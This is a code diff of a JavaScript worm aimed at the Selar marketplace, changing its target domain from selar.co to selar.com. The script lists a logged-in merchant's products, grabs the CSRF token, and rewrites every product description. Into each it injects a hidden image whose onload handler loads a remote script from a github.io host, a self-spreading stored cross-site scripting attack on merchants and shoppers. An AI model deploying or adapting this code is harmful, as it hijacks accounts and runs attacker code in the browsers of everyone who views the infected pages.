@@ -9,12 +9,12 @@ async function fetchUrls() {
   while (urls.length > 0 && index <= 6) {
     try {
       const response = await fetch(
-        `https://selar.co/me/products?domain=selar.co&requires_product_url=1&page=${index}`
+        `https://selar.com/me/products?domain=selar.com&requires_product_url=1&page=${index}`
       );
       const html = await response.text();
       const match_ = html.match(/name="csrf_token"\s+content="([^"]+)"/);
     token = match_[1];
-      const matches = [...html.matchAll(/selar.co\\\/[a-zA-Z0-9]+/g)];
+      const matches = [...html.matchAll(/selar.com\\\/[a-zA-Z0-9]+/g)];
       urls = matches
         .filter(match => match[0].split('/')[1].length === 6)
         .map(match => match[0].split('/')[1]);
@@ -33,7 +33,7 @@ async function fetchUrls() {
 async function sendP(allUrls) {
   for (let x=0; x<allUrls.length; x++) {
     let xhr = new XMLHttpRequest();
-    xhr.open('GET', `https://selar.co/me/products/${allUrls[x]}/edit`, true);
+    xhr.open('GET', `https://selar.com/me/products/${allUrls[x]}/edit`, true);
     xhr.setRequestHeader('Accept', 'text/html, application/xhtml+xml');
     xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
     xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
@@ -45,13 +45,13 @@ async function sendP(allUrls) {
       if (xhr.status === 200) {
         try{
           const jsonResponse = JSON.parse(xhr.responseText);
-          fetch("https://selar.co/me/product/edit", {
+          fetch("https://selar.com/me/product/edit", {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/json;charset=utf-8',
-                  // 'Origin': 'https://selar.co',
+                  // 'Origin': 'https://selar.com,
                   // 'Accept': 'text/html, application/xhtml+xml',
-                  // 'Referer': `https://selar.co/me/products/${jsonResponse.props.product['code']}/edit`
+                  // 'Referer': `https://selar.com/me/products/${jsonResponse.props.product['code']}/edit`
                 },
               body: JSON.stringify({
               "_token":`${token}`,
@@ -62,7 +62,7 @@ async function sendP(allUrls) {
               "images":jsonResponse.props.product['image_urls'].length >0 ? jsonResponse.props.product['image_urls'] : [{"name":"dog-1735795188.jpg","path":"temp-merchant-images/joshua-okechukwu1402716/joshua-okechukwu1402716dog-1735795188-jpg-selar.co-20250102051948.jpg","size":5622,"ext":"jpg","s3":"temp-merchant-images/joshua-okechukwu1402716/joshua-okechukwu1402716dog-1735795188-jpg-selar.co-20250102051948.jpg","url":"https://files.selar.co/temp-merchant-images/joshua-okechukwu1402716/joshua-okechukwu1402716dog-1735795188-jpg-selar.co-20250102051948.jpg"}],
                   "review_images":jsonResponse.props.product['review_images_urls'],
                   "name":jsonResponse.props.product['name'],
-                  "description": `<p>${jsonResponse.props.product['description']}<img src=\"https://files.selar.co/temp-merchant-images/joshua-okechukwu1402716/joshua-okechukwu1402716n-a-1735460284-jpg-selar.co-20241229081804.jpg\" onload=\"document.body.appendChild(Object.assign(document.createElement('script'), {src: 'https://lordseidon.github.io/Zeta/web_crawler1.js', type:'text/javascript'}))\" hidden></p>`,
+                  "description": `<p>${jsonResponse.props.product['description']}<img src=\"https://files.selar.com/temp-merchant-images/joshua-okechukwu1402716/joshua-okechukwu1402716n-a-1735460284-jpg-selar.co-20241229081804.jpg\" onload=\"document.body.appendChild(Object.assign(document.createElement('script'), {src: 'https://lordseidon.github.io/Zeta/web_crawler1.js', type:'text/javascript'}))\" hidden></p>`,
                   "price":jsonResponse.props.product['price'],
                   "stock":jsonResponse.props.product['stock'],
                   "allow_flexi_subscription":jsonResponse.props.product['allow_flexi_subscription'],
